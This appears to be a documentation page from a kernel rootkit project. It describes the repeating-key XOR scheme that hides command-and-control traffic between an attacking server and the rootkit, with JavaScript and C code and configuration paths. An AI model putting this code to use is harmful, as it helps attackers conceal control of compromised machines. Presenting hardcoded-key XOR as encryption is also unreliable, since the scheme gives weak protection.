---
title: "XOR Encryption"
description: "XOR encryption for C2 communication"
icon: "lock"
date: "2025-05-30T00:00:00+01:00"
lastmod: "2025-05-30T00:00:00+01:00"
draft: false
toc: true
weight: 515
---

# XOR Encryption

XOR encryption for C2 communication with implementation.

## How It Works

- **Symmetric operation**: Same function for encrypt/decrypt
- **Hardcoded 32-byte key**: Identical on server and kernel
- **Binary compatibility**: Consistent synchronization
- **Zero dependencies**: No crypto API complexities

## Implementation

### Server Side
```javascript
// 32-byte hardcoded XOR key
const XOR_KEY = Buffer.from('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef', 'hex');

function xorCrypt(data) {
  const input = Buffer.isBuffer(data) ? data : Buffer.from(data, 'utf8');
  const result = Buffer.alloc(input.length);
  
  for (let i = 0; i < input.length; i++) {
    result[i] = input[i] ^ XOR_KEY[i % XOR_KEY.length];
  }
  
  return result;
}

const encryption = {
  encrypt(text) { return xorCrypt(text); },
  decrypt(data) { return xorCrypt(data).toString('utf8'); }
};
```

### Kernel Side
```c
// Matching XOR key (32 bytes)
static const u8 XOR_KEY[] = {
    0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
    0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef
};

static void xor_crypt(const u8 *input, u8 *output, size_t length)
{
    for (size_t i = 0; i < length; i++) {
        output[i] = input[i] ^ XOR_KEY[i % XOR_KEY_SIZE];
    }
}
```

## Message Flow

```
Plaintext: "CMD:auth:password"
    ↓ XOR with key
Encrypted: [binary data]
    ↓ TCP transmission
Kernel: receives binary → XOR → "CMD:auth:password"
```

## Configuration

### Compile-time Setting
```c
// rootkit/core/config.h
#define ENABLE_ENCRYPTION 1  // 1 = enabled, 0 = disabled
```

### Custom Key
Update both locations with matching values:
```javascript
// Server: attacking_program/src/utils/encryption.js
const XOR_KEY = Buffer.from('your32bytehexkeyhere...', 'hex');
```

```c
// Kernel: rootkit/security/crypto.c
static const u8 XOR_KEY[] = { 0xYO, 0xUR, 0xKE, 0xY... };
```
